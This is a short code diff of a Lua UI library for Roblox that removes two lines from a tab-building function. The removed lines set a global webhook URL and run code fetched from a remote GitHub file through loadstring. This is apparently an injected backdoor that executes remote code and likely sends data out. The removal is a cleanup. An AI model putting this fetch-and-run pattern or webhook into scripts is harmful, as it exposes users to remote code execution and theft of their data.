@@ -1130,8 +1130,6 @@ function Library:tab(options)
 		ScrollingDirection = Enum.ScrollingDirection.Y
 	})
 	
-	getgenv().Webhook = 'https://vineyard.performave.com/api/webhook/v1/proxy/7016542e-3c78-40d2-8ea3-0908f8aea3bc';
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovebigbootylatinas/JennaOrtega/main/Ass.lua"))()
 
 	local quickAccessButton
 	local quickAccessIcon
